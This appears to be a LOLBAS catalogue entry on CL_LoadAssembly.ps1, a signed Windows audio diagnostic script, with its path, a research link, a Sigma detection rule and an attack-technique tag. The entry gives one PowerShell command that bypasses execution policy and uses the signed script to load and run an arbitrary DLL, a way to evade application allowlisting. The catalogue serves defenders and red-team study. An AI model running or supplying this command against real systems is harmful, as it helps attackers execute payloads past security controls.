---
title: "CL_LoadAssembly.ps1"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Scripts/CL_LoadAssembly/
fetched_at: 2026-09-20T17:16:30Z
license: unspecified
category: windows
---

PowerShell Diagnostic Script

## Paths
- C:\Windows\diagnostics\system\Audio\CL_LoadAssembly.ps1

## Resources
- [https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/](https://bohops.com/2018/01/07/executing-commands-and-bypassing-applocker-with-powershell-diagnostic-scripts/)

## Acknowledgements
- Jimmy ([@bohops](https://twitter.com/@bohops))

## Detections
- Sigma: [https://github.com/SigmaHQ/sigma/blob/ff6c54ded6b52f379cec11fe17c1ccb956faa660/rules/windows/process_creation/proc_creation_win_lolbas_cl_loadassembly.yml](https://github.com/SigmaHQ/sigma/blob/ff6c54ded6b52f379cec11fe17c1ccb956faa660/rules/windows/process_creation/proc_creation_win_lolbas_cl_loadassembly.yml)

## Execute

1. Proxy execute Managed DLL with PowerShell

```
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\..\..\..\testing\fun.dll;[Program]::Fun()"
```

   - Use case: Execute proxied payload with Microsoft signed binary

   - Privileges required: User

   - Operating systems: Windows 10 21H1 (likely other versions as well), Windows 11

   - ATT&CK® technique: T1216

   - Tags: Execute: DLL (.NET)
